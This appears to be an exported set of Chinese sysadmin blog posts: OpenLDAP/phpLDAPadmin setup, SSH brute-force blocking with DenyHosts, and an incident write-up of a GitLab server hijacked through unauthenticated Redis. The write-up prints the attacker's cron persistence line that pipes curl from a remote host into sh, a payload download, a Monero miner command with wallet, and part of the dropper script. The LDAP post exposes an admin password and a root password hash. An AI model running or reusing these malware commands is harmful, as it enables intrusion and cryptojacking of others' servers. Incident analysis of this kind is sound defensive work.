DB_CONFIG-rw-------. 1 ldap ldap 8192 9月 28 15:51 dn2id.bdb-rw-------. 1 ldap ldap 32768 9月 28 15:51 id2entry.bdb-rw-------. 1 ldap ldap 10485760 9月 28 16:10 log.0000000001[root@openldap ldap]# service slapd restart停止 slapd： [确定]正在启动 slapd： [确定][root@openldap ldap]# service slapd start正在启动 slapd：ln: 创建硬链接\"/var/run/slapd.pid\": 文件已存在[root@openldap ldap]# service slapd statusslapd (pid 2197) 正在运行...You have new mail in /var/spool/mail/root 在下一步执行： # rm -rf /etc/openldap/slapd.d/* 测试并生成配置文件： slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d 返回config file testing succeeded,则配置成功。 赋予生成的配置文件予权限并重启： 12345# chown -R ldap:ldap /etc/openldap/slapd.d# service slapd restartnetstat -tulnp | grep slapdtcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 2358/slapdtcp 0 0 :::389 :::* LISTEN 2358/slapd ## 4.创建一个账号，以备客户端测试登陆 12# useradd ldapuser1# passwd ldapuser1 至此，这些用户仅仅是系统上存在的用户`（存储在/etc/passwd和/etc/shadow上）`，并没有在LDAP数据库里，所以要把这些用户导入到LDAP里面去。但LDAP只能识别特定格式的文件 即后缀为ldif的文件（也是文本文件），所以不能直接使用`etc/passwd和/etc/shadow。` 需要migrationtools这个工具把这两个文件转变成LDAP能识别的文件。 ## 5. 安装配置migrationtools yum install migrationtools -y #### 进入migrationtool配置目录 123456789101112131415161718#cd /usr/share/migrationtools/首先编辑migrate_common.ph# vi migrate_common.ph...# Default DNS domain$DEFAULT_MAIL_DOMAIN = \"ihaozhuo.com\";# Default base$DEFAULT_BASE = \"dc=ihaozhuo,dc=com\";.....保存退出。：-）K.下面利用pl脚本将/etc/passwd 和/etc/shadow生成LDAP能读懂的文件格式，保存在/tmp/下# ./migrate_base.pl &gt; /tmp/base.ldif# ./migrate_passwd.pl /etc/passwd &gt; /tmp/passwd.ldif# ./migrate_group.pl /etc/group &gt; /tmp/group.ldif #### 说明： 第一次启动生会初始化ldap数据库，在/var/lib/ldap中，如果想删除ldap数据库就删除该目录，保留DB_CONFIG配置文件。新版的ldap使用的是/etc/openldap/slapd.d 下的配置文件，删除原来的配置文件，slaptest是重新生成新的配置文件. ## 6.导入数据 下面就要把这三个文件导入到LDAP，这样LDAP的数据库里就有了我们想要的用户 1234# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/base.ldif# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/passwd.ldif# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/group.ldif过程若无报错，则LDAP服务端配置完毕. 执行成功会出现： 1234567891011121314151617181920212223242526272829303132333435[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/base.ldifEnter LDAP Password:adding new entry \"dc=ihaozhuo,dc=com\"adding new entry \"ou=Hosts,dc=ihaozhuo,dc=com\"adding new entry \"ou=Rpc,dc=ihaozhuo,dc=com\"adding new entry \"ou=Services,dc=ihaozhuo,dc=com\"adding new entry \"nisMapName=netgroup.byuser,dc=ihaozhuo,dc=com\".........[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/passwd.ldifEnter LDAP Password:adding new entry \"uid=root,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=bin,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=daemon,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=adm,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=lp,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=sync,ou=People,dc=ihaozhuo,dc=com\".....[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/group.ldifEnter LDAP Password:adding new entry \"cn=root,ou=Group,dc=ihaozhuo,dc=com\"adding new entry \"cn=bin,ou=Group,dc=ihaozhuo,dc=com\"....... ldapsearch 查看数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128[root@openldap migrationtools]# ldapsearch -x -b \"dc=ihaozhuo,dc=com\"# extended LDIF## LDAPv3# base &lt;dc=ihaozhuo,dc=com&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## ihaozhuo.comdn: dc=ihaozhuo,dc=comdc: ihaozhuoobjectClass: topobjectClass: domain# Hosts, ihaozhuo.comdn: ou=Hosts,dc=ihaozhuo,dc=comou: HostsobjectClass: topobjectClass: organizationalUnit# Rpc, ihaozhuo.comdn: ou=Rpc,dc=ihaozhuo,dc=comou: RpcobjectClass: topobjectClass: organizationalUnit# Services, ihaozhuo.comdn: ou=Services,dc=ihaozhuo,dc=comou: ServicesobjectClass: topobjectClass: organizationalUnit# netgroup.byuser, ihaozhuo.comdn: nisMapName=netgroup.byuser,dc=ihaozhuo,dc=comnisMapName: netgroup.byuserobjectClass: topobjectClass: nisMap# Mounts, ihaozhuo.comdn: ou=Mounts,dc=ihaozhuo,dc=comou: MountsobjectClass: topobjectClass: organizationalUnit# Networks, ihaozhuo.comdn: ou=Networks,dc=ihaozhuo,dc=comou: NetworksobjectClass: topobjectClass: organizationalUnit# People, ihaozhuo.comdn: ou=People,dc=ihaozhuo,dc=comou: PeopleobjectClass: topobjectClass: organizationalUnit# Group, ihaozhuo.comdn: ou=Group,dc=ihaozhuo,dc=comou: GroupobjectClass: topobjectClass: organizationalUnit# Netgroup, ihaozhuo.comdn: ou=Netgroup,dc=ihaozhuo,dc=comou: NetgroupobjectClass: topobjectClass: organizationalUnit# Protocols, ihaozhuo.comdn: ou=Protocols,dc=ihaozhuo,dc=comou: ProtocolsobjectClass: topobjectClass: organizationalUnit# Aliases, ihaozhuo.comdn: ou=Aliases,dc=ihaozhuo,dc=comou: AliasesobjectClass: topobjectClass: organizationalUnit# netgroup.byhost, ihaozhuo.comdn: nisMapName=netgroup.byhost,dc=ihaozhuo,dc=comnisMapName: netgroup.byhostobjectClass: topobjectClass: nisMap# root, People, ihaozhuo.comdn: uid=root,ou=People,dc=ihaozhuo,dc=comuid: rootcn: rootobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JHJCNmVjYmdEZGtUR2w1c3QkTldDc1NQNXJBYXU3QkhpUWlXVXl LaXl4dW9VNWtFNm0wZ1dILmRzaXhFL2ZPTG1zOC52OTdNdXVuNkZlNjhDOExTYmtvVjdiaW03Lmti ak1ZbURVZC4=shadowLastChange: 17056shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 0gidNumber: 0homeDirectory: /rootgecos: root# bin, People, ihaozhuo.comdn: uid=bin,ou=People,dc=ihaozhuo,dc=comuid: bincn: binobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSo=shadowLastChange: 15980shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /sbin/nologinuidNumber: 1gidNumber: 1homeDirectory: /bingecos: bin................ /相关信息导入数据库成功 ## 7.实现LDAP用户home目录自动挂载 1234567891011121314151617181920212223centos 6 :yum install nfs-utils rpcbind服务器端： ###(建立挂载的目录，并且挂载目录。)[root@openldap ~]# mkdir /opt/centos6[root@openldap ~]# cd /opt/centos6/[root@openldap centos6]# mkdir thisISnfsFile[root@openldap centos6]# vi /etc/exports[root@openldap centos6]# chkconfig nfs on[root@openldap centos6]# /etc/init.d/rpcbind start正在启动 rpcbind： [确定][root@openldap centos6]# /etc/init.d/nfs start启动 NFS 服务： [确定]启动 NFS mountd： [确定]启动 NFS 守护进程： [确定]正在启动 RPC idmapd： [确定][root@openldap centos6]# cat /etc/exports/opt/centos6 *(rw,sync)### 备注：/opt/centos6表示nfs共享的目录 有读写权限。这个可以不需要写：/opt/centos6 192.168.1.0/24(ro,no_root_squash)### 备注:/opt/centos6表示nfs共享的目录 192.168.1.0-192.168.1.254区间的IP可以访问，访问权限是自读，root 用户 可参考：[Nfs共享同步](http://blog.chinaunix.net/uid-26284318-id-3111651.html) ## 8.使用 phpLDAPadmin OpenLDAP 安装目录的 bin 子目录下提供了管理目录树的客户端命令(如 ldapadd、ldapdelete 和 ldapsearch 等),但对于不熟悉 OpenLDAP 命令的初学者而言,使用它们去管理目录树是一件非 常麻烦的事。可以借助于图形界面的 LDAP管理工具来管理目录树,其中,用 PHP 编写的 phpLDAPadmin 就是一款很好的选择。 1.1 初始化数据 为了能使用 phpLDAPadmin 管理目录树,需要为目录树建立初始化数据,方法是将初始化数 据保存在 LDIF 文件中,然后使用 ldapadd 命令导入 LDAP 的数据库中。 LDIF 是 LDAP Data Interchange Format (即 LDAP 数据交换格式)的缩写。将 LDAP 保存为 一种简单的文本格式,该格式可以用于在符合 LDAP 标准的目录上完成批量操作,如添加、修改、 删除和导入、导出数据等批量操作。LDIF 可以在来自两个不同的厂家的 LDAP 服务器间交换数据, 即使 LDAP 服务器使用不同的后台数据库或运行在不同的操作系统上。 这一步已经在上面导入过数据了。 * 下载与安装 phpLDAPadmin 是一款开放源代码的,通过它提供的友好用户界面,只要使用 Web 浏览器即 可轻松管理本地或远程的 LDAP 服务器,例如浏览 LDAP 目录树,创建/删除/修改和复制节点, 执行搜索,导入/导出 LDIF 文件,查看服务器 schema。还可以在两个 LDAP 服务器之间复制对象、 恢复删除、复制树节点。phpLDAPadmin 的下载地址是 http://phpldapadmin.sourceforge.net/ 实现phpldapadmin 网页WEB管理用户 需要注意的是`,phpLDAPadmin `是一个基于 `web `的管理工具,因此,若要正常使用 phpLDAPadmin,需要确保` Apache` 服务器运行正常。 123456789yum install httpd -yvi /etc/httpd/conf/httpd.conf添加：....ServerName 192.168.1.186:80.....service httpd start 先通过scp上传phpldapadmin-1.2.3.zip到apache网页目录 下载：[phpldapadmin](https://sourceforge.net/projects/phpldapadmin/files/phpldapadmin-php5/1.2.3/phpldapadmin-1.2.3.tgz) 或者这里用我下载好的链接wget. cd /var/www/html/ wget http://oak0aohum.bkt.clouddn.com/phpldapadmin-1.2.3.tgz tar -zxvf phpldapadmin-1.2.3.tgz mv phpldapadmin-1.2.3 phpldapadmin cd phpldapadmin/config/ cp config.php.example config.php vim config.php #### 2.修改配置文件 用文本编辑器打开 config.php 文件后发现,尽管文件行数几百行,但实际上很多都是 php 程 序的注释语句。因此,只需要修改其中一部分内容,即可完成 phpLDAPadmin 的配置。设置如下: 12345678910/*$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','LDAP Server');$servers-&gt;setValue('server','host','192.168.1.186');$servers-&gt;setValue('server','port',389);$servers-&gt;setValue('server','base',array('dc=ihaozhuo,dc=com'));$servers-&gt;setValue('login','auth_type','cookie');$servers-&gt;setValue('login','bind_id','cn=admin,dc=ihaozhuo,dc=com');$servers-&gt;setValue('login','bind_pass','qwe123.com');$servers-&gt;setValue('server','tls',false); #### 对以上的设置作如下说明: LDAP 服务器名 $ldapservers-&gt;SetValue($i,'server','name','My LDAP Server'); 使用以上语句,设置 LDAP 服务器名称为“My LDAP Server”。 &gt; LDAP 服务器 IP $ldapservers-&gt;SetValue($i,'server','host','192.168.1.186'); 使用以上语句,设置 LDAP 服务器地址为“192.168.1.186”。 &gt;LDAP 服务器管理员 DN $ldapservers-&gt;SetValue($i,'login','dn','cn=admin,dc=ihaozhuo,dc=com'); 设置 LDAP 服务器管理员 DN为`“cn=Manager,dc=example,dc=com”。` &gt;LDAP 服务器管理员口令 $ldapservers-&gt;SetValue($i,'login','pass',''); 此处将 LDAP 服务器管理员口令设置为空。 LDAP 服务器认证方式phpLDAPadmin 提供了 cookie、session 和 config 这三种认证方式。cookie 方式提供一个登录 的界面,让用户输入正确的 LDAP 管理员的 DN 和口令才允许登录到服务器,同时 LDAP 管理员 的 DN 与口令会保存在客户端 Web 浏览器的 cookie 里面。session 方式类似 cookie,不同点在于 LDAP 管理员的 DN 与口令保存在服务器端,而不是客户端。config 是 phpLDAPadmin 缺省的认证 方式,不需要用户登录,但需要将LDAP管理员的DN和口令写在phpLDAPadmin的主配置文件中。 以上语句表明 phpLDAPadmin 采用 cookie 认证。在使用 cookie 认证方式时,必须配置一个口 令加密字符串,以便安全地加密和解密一些敏感信息。'blowfish'就是口令加密字符串,可以随意 设置,例如设置为“phpldapadmin”。 删除的内容: ‘ 删除的内容: ’ 设置完毕后,保存 config.php 文件使设置生效。 ## apache-http修改 vim /etc/httpd/conf/httpd.conf &lt;Directory \"/var/www/html/phpldapadmin\"&gt; DirectoryIndex index.html index.html.var index.php 重启服务。 service httpd restart ## 网页访问 http://192.168.1.186/phpldapadmin 报错无法正常访问，是由于php,php-ldap依赖包没有安装. 安装php可参考我博客上面文档：[PHP编译升级YUM最全面安装部署](http://blog.yangcvo.me/2015/12/21/PHP%E7%BC%96%E8%AF%91%E5%8D%87%E7%BA%A7YUM%E6%9C%80%E5%85%A8%E9%9D%A2%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/) 安装完，重启http服务。 service httpd restart 设置防火墙访问： -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT 重启iptables service iptables restart #### 1.登录 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap4.png) 单击左侧“Login”链接,打开如图1.1 所示页面,输入 ldap 服务器认证信息。此处应当输 入管理员的 DN 和密码。 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap5.png) 单击“认证”按钮后,进入 phpLDAPadmin 管理页面,如图 1.2所示。页面右侧提示“LDAP 服务器认证成功”,页面左侧是 LDAP 的目录树。 在左页面中单击【dc=ihaozhuo,dc=com】链接,在右页面中会出现目录树的各种属性并提供各 种操作链接。 &gt;查看对象 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap6.png) 因为之前导入了 LDIF 文件,初始化的数据在此处可以显示出来。 #### 2.创建对象 选择【创建一个子条目】链接,在出现的【创建对象】页面中,选择【Organization Unit】(组 织机构),如图1.3所示。 &gt;选择需要创建的对象 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap7.png) 单击【Organization Unit】前面的单选按钮后,进入创建【Organization Unit】界面,如图 &gt;创建新组织机构(OU) ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap8.png) 在 phpLDAPadmin 中创建 LDAP 目录树中的其他对象,同样使用如上所述的方法,不同的是 需要在图1.3 中选择不同的对象。 &gt; 创建 OU 成功 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap9.png) #### 3.导入导出 使用导入导出按钮,可以将 LDAP 服务器使用的 LDIF 文件导出,也可以导入需要的 LDIF 文 件。直接导入导出 LDIF 文件是管理 LDAP 目录树一种快捷方法。 在该页面中,单击【浏览】按钮,选择相关的 LDIF 文件,或是直接在【Paste your LDIF file】 文件的位置输入 LDIF 文件内容,单击【Proceed】按钮,开始导入。 若导入成功,显示如下图所示提示内容。若导入不成功,同样会出现相关错误提示。 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap10.png) 选择导出操作时,单击页面左侧【export】导出链接,出现如图 所示【导出】页面。在 该页面中,选择 DN;导出范围、导出格式及行结束标志等都在该页面中设置。 ![](http://7xrthw.com1.z0.glb.clouddn.com/openldap11.png) 注意： 导入用户成功以后，再次导入或者创建 下次不要重复导入。不然会报错，68 导入group 和user就行，过滤 、/etc/passwd 、/etc/group新建的用户，导入成功以后，重新刷新。 ## 设置 LDIF 文件 LDAP 数据交换格式(LDIF)是指存储 LDAP 配置信息及目录内容的标准文本文件格式,之 所以使用文本文件格式来存储这些信息是为了方便读取和修改。LDAP 也是其他大多数服务配置 文件所采取的格式。LDIF 文件常用来向目录导入或更改记录信息,这些信息需要按照 LDAP 中 schema 的格式进行组织,并会接受 schema 的检查,不符合其要求的格式将会出现报错信息。 #### 1.语法格式 LDIF 文件中条目的语法结构如下: ```bash dn: &lt;distinguished name&gt; &lt;attrdesc&gt;: &lt;attrvalue&gt; &lt;attrdesc&gt;: &lt;attrvalue&gt; &lt;attrdesc&gt;:: &lt;base64-encoded-value&gt; &lt;attrdesc&gt;:&lt; &lt;URL&gt; ... 1例如: ```bash #LDIF file example dn: dc=mydomain,dc=org objectClass: domain dc: mydomain 以“#”号开头的为注释行;第二行起的各行中,冒号左边为属性,右边是属性的值,与编程 中的变量及为其所赋的值类似,LDIF 文件中属性可以被重复赋值。 以下是一个有三个条目的 LDIF 文件: ```bash dn: cn=Barbara J Jensen,dc=example,dc=com cn: Barbara J Jensen cn: Babs Jensen objectclass: person description:&lt; file:///tmp/babs sn: Jensen dn: cn=Bjorn J Jensen,dc=example,dc=com cn: Bjorn J Jensen cn: Bjorn Jensen objectclass: person sn: Jensen dn: cn=Jennifer J Jensen,dc=example,dc=com cn: Jennifer J Jensen cn: Jennifer Jensen objectclass: person sn: Jensen jpegPhoto:: /9j/4AAQSkZJRgABAAAAAQABAAD/2wBDABALD A4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQ ERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVG ... 12345#### 2.创建 LDIF 文件 可以用任何文本编辑器以 root 用户进行创建 LDIF 文件。当创建 LDIF 文件时需要注意,在每 个 DN 行前应添加空行,确保 LDAP 能够识别是一个新的 DN 的开始。 例如,创建 test.ldif 文件。 3.定义基准 DN使用如下内容定义基准 DN。 ``` dn: dc=test, dc=net objectClass: top objectClass: dcobject objectClass: organization o: Test, Inc. dc: test 4.定义管理员 1 dn: cn=manager, dc=test, dc=net objectClass: organizationalRole cn: manager description: A Manager of Test, inc. ``` 5.定义组织机构 ``` dn: ou=members, dc=test, dc=net objectClass: organizationalUnit ou: members 6.定义用户 dn: cn=Ray D. Jones, ou= members, dc=test, dc=netobjectClass: organizationalPersonobjectClass: inetOrgPersoncn: Ray D. Jonessn: JonestelephoneNumber: 444-555-6767mail: jonesrd@test.netlocalityName: Houstondn: cn=Eric S. Woods, ou= members, dc=test, dc=netobjectClass: organizationalPersonobjectClass: inetOrgPersoncn: Eric S. Woodssn: WoodstelephoneNumber: 444-555-6768mail: woodses@test.netlocalityName: Houston123 7.保存并导入 LDIF 文件 使用如下命令导入 LDIF 文件``` # ldapadd -x -W -D \"cn=manager,dc=test,dc=net\" -f test.ldif Enter LDAP Password: 此处输入的口令是 LDAP 管理员口令,-x 表明使用简单验证。-D 表示使用在 slapd.conf 文件 中所定义的 DN。-W 表示提示输入口令而不是从命令行输入。-f 表明要装载的文件“test.ldif”。ldapadd 命令成功添加了每个条目内容同时,会列出每个条目内容有关的 DN。 8.搜索目录 搜索目录使用 ldapsearch 命令,搜索结果如下: 1# ldapsearch -x -W -D 'cn=manager,dc=test,dc=net' -b ' dc=test,dc=net ' '(objectClass=*)' Enter LDAP Password: # extended LDIF # # LDAPv3 # base &lt; dc=test,dc=net &gt; with scope subtree # filter: (objectClass=*) # requesting: ALL # # test. net dn: dc=test, dc=net objectClass: top objectClass: dcobject objectClass: organization o: Test, Inc. dc: test # manager, test. net dn: cn=manager, dc=test, dc=net objectClass: organizationalRole cn: manager description: A Manager of Test, inc. # members, test. net dn: ou=members, dc=test, dc=net objectClass: organizationalUnit ou: members ...","link":"/2017/03/29/OpenLDAP/OpenLDAP服务的配置与管理-phpldapadmin管理认证/"},{"title":"化解自己的阿里云服务器被黑客攻击-暴力破解","text":"说明下：因为阿里云服务器我是用来自己搭建blog 的做了一些简单的监控。 因为防止被攻击瘫痪，做到安全防范，可是今天晚上吃完饭，发现又被人攻击，是印度和巴西IP地址暴力破解方式一直在尝试破解我密码。 1还好我在阿里云上面使用了云盾告警，其实它这个一般般，只能提醒，不能有效阻止黑客攻击。 收到告警以后，马上打开电脑去云盾上面查看下。 然后看了以后发现问题不大，可是上机器查看，发现有不断的攻击痕迹。日志查看到很多来历不明的IP。德国🇩🇪 巴西 印度。 看到这个，我就写了个脚本记录被攻击留下的保存指定文件夹，我看下是否还在继续攻击了。 123456789101112131415161718 #!/bin/bash#Denyhosts SHELL SCRIPT#2016-2-18cat /var/log/secure|awk '/Failed/&#123;print $(NF- 3)&#125;'|sort|uniq -c|awk '&#123;print $2\"=\" $1;&#125;' &gt;/root/bin/Denyhosts.txtDEFINE=\"10\"for i in `cat /root/bin/Denyhosts.txt`do IP=`echo $i|awk -F= '&#123;print $1&#125;'` NUM=`echo $i|awk -F= '&#123;print $2&#125;'` if [ $NUM -gt $DEFINE ] then grep $IP /etc/hosts.deny &gt;/dev/null if [ $? -gt 0 ]; then echo \"sshd:$IP\" &gt;&gt; /etc/hosts.deny fi fidone 因为保存到其他的txt文件下面： 1234[root@iZ28by3xm9eZ bin]# ll总用量 4-rwxr-xr-x 1 root root 535 2月 17 21:38 Denyhosts.sh-rw-r--r-- 1 root root 0 2月 17 21:45 Denyhosts.txt 查看里面有不断攻击的IP : 123456789[root@iZ28by3xm9eZ bin]# vim Denyhosts.txt101.69.252.146=1115.196.20.181=11117.243.176.226=6186.208.19.61=5186.251.118.71=389.238.64.148=294.215.141.101=1 这里我记录了攻击的多少次也有的。 可是发现的确在继续攻击，我在想如何阻止被破解呢。 主要是依靠denyhost软件。稳重所讲的是下载安装包安装，实际上可以从直接使用yum或者apt安装，找到相应的源就可以。下边是帖子原文： DenyHosts官方网站为：http://denyhosts.sourceforge.net 这里下载最新的版本是2008年 2.6 版本的 一直没更新。不过已经足够强大。 1. 安装 123# tar -zxvf DenyHosts-2.6.tar.gz# cd DenyHosts-2.6# python setup.py install 默认是安装到/usr/share/denyhosts目录的。 1.配置 1234567891011121314151617181920212223# cd /usr/share/denyhosts/# cp denyhosts.cfg-dist denyhosts.cfg# vi denyhosts.cfgPURGE_DENY = 50m #过多久后清除已阻止IPHOSTS_DENY = /etc/hosts.deny #将阻止IP写入到hosts.denyBLOCK_SERVICE = sshd #阻止服务名DENY_THRESHOLD_INVALID = 1 #允许无效用户登录失败的次数DENY_THRESHOLD_VALID = 10 #允许普通用户登录失败的次数DENY_THRESHOLD_ROOT = 5 #允许root登录失败的次数WORK_DIR = /usr/local/share/denyhosts/data#将deny的host或ip纪录到Work_dirDENY_THRESHOLD_RESTRICTED = 1 #设定 deny host 写入到该资料夹LOCK_FILE = /var/lock/subsys/denyhosts #将DenyHOts启动的pid纪录到LOCK_FILE中，已确保服务正确启动，防止同时启动多个服务。HOSTNAME_LOOKUP=NO #是否做域名反解 ADMIN_EMAIL = #设置管理员邮件地址DAEMON_LOG = /var/log/denyhosts #自己的日志文件DAEMON_PURGE = 10m #该项与PURGE_DENY 设置成一样，也是清除hosts.deniedssh 用户的时间。 2.设置启动脚本 123# cp daemon-control-dist daemon-control# chown root daemon-control# chmod 700 daemon-control 完了之后执行daemon-contron start就可以了。 1# ./daemon-control start 如果要使DenyHosts每次重起后自动启动还需做如下设置： 123# ln -s /usr/share/denyhosts/daemon-control /etc/init.d/denyhosts# chkconfig --add denyhosts# chkconfig denyhosts on 然后就可以启动了： 1# service denyhosts start 可以看看/etc/hosts.deny内是否有禁止的IP，有的话说明已经成功了。 启动出现错误解决： 1./daemon-control start 出现：starting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py --daemon --config=/usr/share/denyhosts/denyhosts.cfg DenyHosts could not obtain lock (pid: ) [Errno 17] File exists: &#39;/var/lock/subsys/denyhosts&#39; 使用： 1234567 touch /private/var/log/system.log touch /var/lock/subsys/denyhostsrm -f /var/lock/subsys/denyhosts./daemon-control startstarting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py –daemon –config=/usr/share/denyhosts/denyhosts.cfg OK！ 启动完成啦。 你可以使用 1service denyhosts status来查看运行状态 DenyHosts is running with pid = 25874 表示已经启动起来了。接下来就可以使用 1cat /etc/hosts.deny来查看记录了 然后启动成功以后，我自己测试了下， 1234567ssh root@115.28.175.207root@115.28.175.207's password:Permission denied, please try again.root@115.28.175.207's password:cPermission denied, please try again.root@115.28.175.207's password:Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password). 发现自己登陆不上去了，然后只能去阿里控制台操作查看原因。 原来发现 cat /etc/hosts.deny来查看记录了 然后去掉，115IP 发现就可以登陆了。 所以我做的设置是root尝试破解4次以上，被锁定。","link":"/2016/06/29/运维安全/ 化解自己的阿里云服务器被黑客攻击-暴力破解/"},{"title":"gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？","text":"今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。毕竟这个关乎着开发今天可能无法提交代码。 第一时间我查看什么原因导致我gitlab 500。根据以往经验gitlab出现500 第一：版本出现bug，第二：服务器网络不正常，请求不到。 然后查看日志： 1234567891011121314[root@GitLab ~]# tailf -1000 /home/git/gitlab/log/production.logStarted POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:26 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:31 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:37 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:14:42 +0800Started POST \"//api/v3/internal/allowed\" for 139.129.22.17 at 2017-01-06 10:15:35 +0800Started GET \"/\" for 177.154.56.233 at 2017-01-06 10:15:55 +0800Processing by DashboardController#show as */*Completed 401 Unauthorized in 55msRedis::CommandError (NOAUTH Authentication required.): config/initializers/redis-store-fix-expiry.rb:10:in `block in setex' config/initializers/redis-store-fix-expiry.rb:10:in `setter’ 这里提示Redis需要认证，Redis::CommandError (NOAUTH Authentication required.):这里当初就没有认证的，突然需要认证，明显被人黑了。 因为redis服务在2016年3月份官网发布了一项通知：使用redis主要设置密码。可以看下这篇文章： Redis 未授权访问缺陷可轻易导致系统被黑 全球无验证可直接利用 Redis TOP 10 国家与地区 解决方案 12345678910111213临时解决方案 配置bind选项, 限定可以连接Redis服务器的IP, 并修改redis的默认端口6379.配置AUTH, 设置密码, 密码会以明文方式保存在redis配置文件中.配置rename-command CONFIG \"RENAME_CONFIG\", 这样即使存在未授权访问, 也能够给攻击者使用config指令加大难度好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config官方解决方案 暂无官方解决方案 现在版本gitlab 7.0版本的没有redis设置密码一项，所以就觉得奇怪，为什么会有人设置了密码，网站导致获取不到数据就出现500了。 查找原因：什么原因导致CPU一直100%首先SSH登陆，top查看进程，发现奇怪名字的命令AnXqV, ddg.217隐藏进程。 还有一看就感觉有问题。 知道这个进程然后我们单独看下这个进程具体有哪些： 1lsof –c ddg.217 查看关联文件，发现对外的tcp连接，不知道是不是反向shell… 从这里明显可以看的出来，我的redis-6379 被人拿到shell权限了。 从上面可以看到： 这里我到/root/.ddg/17.db这个文件我打开看是乱码加密过的。加密的 看不到数据。 这里第一步删除第一个病毒文件和加权限位：12rm -rf /root/.ddg 删除依赖。他依赖于哪个文件，然后给加一个权限位：chattr +s filename删除掉了 你手动创建，然后加权限位。 第二步分析下面IP地址：1234139.222.173.127139.70.199.90.....后面就不用解释了，这个明显当`肉鸡`了。 临时方法防火墙配置屏蔽这些IP地址。 治标不治本、 这里解决掉12506进程：kill -9 12506 配置 一个hosts 110.0.1.110 www.haveabitchin.com 配置成 百度的ip 帮他配错地址,他肯定请求下载 不到这个脚本了. 然后按进程程序目录下面进入/tmp/删除 ddg.217文件，删除duchduckgo.17.log 这个是病毒运行进程输出的日志文件，删除hsperfadata_root 这个文件里面是个进程，也删除。 然后在看看是否还有没有这个进程：又启动13929这个进程，服务还是占用很高资源CPU：100%定位到是哪个程序 发起的请求.查看：13918这个进程： 从这里明显可以看出来，这个地址： 12/bin/sh -c curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | shcurl -fsSL http://www.haveabitchin.com/ddg.x86_64 -o /tmp/ddg.217 这个明显是哪个程序一直在启动。 第三步继续排查：删除这些发现还是CPU百分百：在继续查看进程： 1root 26373 1 96 Jan01 ? 4-12:14:03 ./minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x 这个进程是什么：mined 百度告诉我们了: mined肉鸡木马 很吃CPU一种病毒。 第一步解决定位木马：1find / -name minerd 在服务器搜索所有相关minerd文件。搜索到了这个文件放在我们/home/目录下面。 第二步删除木马：查看计划任务是否有启动： 12[root@GitLab tmp]# cronte -e*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh 服务器恢复正常： 我这里就贴出了这个木马的脚本内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho \"*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh\" &gt; /var/spool/cron/crontabs/rootif [ ! -f \"/tmp/ddg.217\" ]; then curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217fichmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217killall /tmp/ddg.216if [ -d \"/opt/yam\" ]; then rm -rf /opt/yamfips auxf|grep -v grep|grep /tmp/duckduckgo|awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep \"/usr/bin/cron\"|awk '&#123;print $2&#125;'|xargs kill -9ps 